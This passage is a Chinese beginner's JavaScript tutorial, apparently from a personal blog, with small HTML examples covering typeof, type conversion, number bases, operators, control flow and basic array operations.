<p>咧</p>
<p>下面是用<code>typeof</code>检查a的变量的类型</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a = <span class="string">&quot;你好&quot;</span>;</span></span><br><span class="line"><span class="javascript">    alert(<span class="keyword">typeof</span> a);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201117101104.png"> </p>
<h2 id="类型强行转换"><a href="#类型强行转换" class="headerlink" title="类型强行转换"></a>类型强行转换</h2><h3 id="转换成字符串"><a href="#转换成字符串" class="headerlink" title="转换成字符串"></a>转换成字符串</h3><h4 id="toString-方法转"><a href="#toString-方法转" class="headerlink" title="toString()方法转"></a>toString()方法转</h4><p>语法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数字.toString()   &#x2F;&#x2F;叫数字转换成字符串但是要赋值给其他的变量</span><br></pre></td></tr></table></figure>
<p>咧</p>
<p>下面代码是叫a转换成字符串赋值给b</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a = <span class="number">123</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> b=a.toString();</span></span><br><span class="line"><span class="javascript">    alert(<span class="keyword">typeof</span> b);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201117110236.png"></p>
<h4 id="String-函数转"><a href="#String-函数转" class="headerlink" title="String()函数转"></a>String()函数转</h4><p>语法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String(数字)</span><br></pre></td></tr></table></figure>
<p>咧<br>下面代码是叫a转换成字符串赋值给b</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a = <span class="number">123</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> b=<span class="built_in">String</span>(a);</span></span><br><span class="line"><span class="javascript">    alert(<span class="keyword">typeof</span> b);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201117111025.png"></p>
<h4 id="String-函数和toString-方法区别"><a href="#String-函数和toString-方法区别" class="headerlink" title="String()函数和toString()方法区别"></a>String()函数和toString()方法区别</h4><p>toString()方法不能转换比如null等字符串但是String()函数是可以转换的</p>
<h3 id="字符转换数字"><a href="#字符转换数字" class="headerlink" title="字符转换数字"></a>字符转换数字</h3><h4 id="Number-函数进行转换"><a href="#Number-函数进行转换" class="headerlink" title="Number()函数进行转换"></a>Number()函数进行转换</h4><p>语法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Number(字符串)</span><br></pre></td></tr></table></figure>
<p>咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a = <span class="string">&quot;123&quot;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> b=<span class="built_in">Number</span>(a);</span></span><br><span class="line"><span class="javascript">    alert(<span class="keyword">typeof</span> b);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201117150257.png"></p>
<h4 id="parseInt-和函数"><a href="#parseInt-和函数" class="headerlink" title="parseInt()和函数"></a>parseInt()和函数</h4><p>比如一个字符串是”123px”后面有px这样直接用Number()函数就会报错<br>我们就可以用parseInt()来读取前面的，<br>咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a = <span class="string">&quot;123px&quot;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> b=<span class="built_in">parseInt</span>(a);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="keyword">typeof</span> b);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(b);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201117151708.png"></p>
<h2 id="其他进制数"><a href="#其他进制数" class="headerlink" title="其他进制数"></a>其他进制数</h2><p><code>0x</code>表示16进行<br><code>0</code>表示8进行<br><code>0b</code>表示2进行</p>
<p>咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a =<span class="number">0xff</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> b =<span class="number">055</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> c =<span class="number">0b10</span>; </span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(b);</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(c);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201117153028.png"></p>
<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201123114922.png"></p>
<h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201123141743.png"></p>
<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">! 非运算符</span><br><span class="line">&amp;&amp; 与运算符</span><br><span class="line">|| 或运算符</span><br></pre></td></tr></table></figure>
<h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201123150023.png"></p>
<h3 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h3><p>语法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">条件(真或假)?语法1:语句2;       &#x2F;&#x2F;真执行语法1 ，假执行语句2</span><br></pre></td></tr></table></figure>
<p>咧</p>
<p>下面条件是<code>true</code>执行语句1</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="literal">true</span>?alert(<span class="string">&quot;语句1&quot;</span>):alert(<span class="string">&quot;语句2&quot;</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201123154400.png"></p>
<h2 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h2><p>Unicode编码表<a href="http://www.52unicode.com/">http://www.52unicode.com/</a></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201123152603.png"></p>
<p>字符串输出Unicode编码要在编码前写上<code>\u</code><br>比如我用Unicode编码打印出来1234<br>代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a=<span class="string">&quot;\u0031\u0032\u0033\u0034&quot;</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201123152826.png"></p>
<h2 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h2><p>语法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (条件)&#123;</span><br><span class="line">    当条件为 <span class="literal">true</span> 时执行的代码</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    当条件不为 <span class="literal">true</span> 时执行的代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>if语句的使用和C语言一样</p>
<h2 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h2><p>语法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>(n)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        执行代码块 <span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        执行代码块 <span class="number">2</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        与 <span class="keyword">case</span> <span class="number">1</span> 和 <span class="keyword">case</span> <span class="number">2</span> 不同时执行的代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也和C语言一样</p>
<h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><h3 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h3><p>语法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (条件)</span><br><span class="line">&#123;</span><br><span class="line">    需要执行的代码</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也是和C语言的一样</p>
<h3 id="do-while-循环"><a href="#do-while-循环" class="headerlink" title="do/while 循环"></a>do/while 循环</h3><p>语法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    需要执行的代码</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (条件);</span><br></pre></td></tr></table></figure>
<p>和C语言一样 </p>
<h3 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (语句 <span class="number">1</span>; 语句 <span class="number">2</span>; 语句 <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">    被执行的代码块</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>和C语言一样 </p>
<h3 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h3><p>break;是结束循环<br>continue;是结束一次循环</p>
<p>continue;实咧</p>
<p>下面但是if判断a等于2就执行<code>continue;</code>函数这个函数就会结束这一次循环，注意是一次</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">for</span>(<span class="keyword">var</span> a=<span class="number">0</span>; a&lt;<span class="number">5</span> ; a++ )&#123;</span></span><br><span class="line">    if (a==2)&#123;</span><br><span class="line"><span class="javascript">        <span class="keyword">continue</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201123161621.png"></p>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="数组定义和输出"><a href="#数组定义和输出" class="headerlink" title="数组定义和输出"></a>数组定义和输出</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> 变量名=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>];</span><br></pre></td></tr></table></figure>
<p>使用他</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(数组名[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>
<p>实例</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>];</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a[<span class="number">0</span>]);</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201124083332.png"></p>
<h3 id="数组内容修改"><a href="#数组内容修改" class="headerlink" title="数组内容修改"></a>数组内容修改</h3><p>语法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">数组名[位置]=<span class="string">&#x27;要修改的内容&#x27;</span></span><br></pre></td></tr></table></figure>
<p>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>];</span></span><br><span class="line"><span class="javascript">    a[<span class="number">0</span>]=<span class="string">&#x27;e&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a[<span class="number">0</span>]);</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201124091319.png"></p>
<h3 id="获得长度"><a href="#获得长度" class="headerlink" title="获得长度"></a>获得长度</h3><p>语法 </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">数组名.length</span><br></pre></td></tr></table></figure>
<p>实咧</p>
<p><code>数组名.length</code>他结果会输出数组里面的内容的个数<br>他的结果是4</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>];</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a.length);</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201124084332.png"></p>
<h3 id="输出数组最后的内容"><a href="#输出数组最后的内容" class="headerlink" title="输出数组最后的内容"></a>输出数组最后的内容</h3><p>语法<br>介绍.length是输出数组的内容的个数，然后我在减一就可以输出了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">数组名[数组名.length<span class="number">-1</span>]</span><br></pre></td></tr></table></figure>
<p>实咧<br>下面我定义了a数组用获得数组的长度然后减一</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>];</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(a[a.length<span class="number">-1</span>]);</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201124085802.png"></p>
<h3 id="增加数组内容"><a href="#增加数组内容" class="headerlink" title="增加数组内容"></a>增加数组内容</h3><p>加内容也很简单<br>语法<br>介绍用length是输出数组的内容的个数，数组又是从0开始的所以就可以添加了</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">数组名[数组名.length]=<span class="string">&quot;要添加的内容&quot;</span></span><br></pre></td></tr></table></figure>
<p>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a=[<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>];</span></span><br><span class="line"><span class="javascript">    a[a.length]=<span 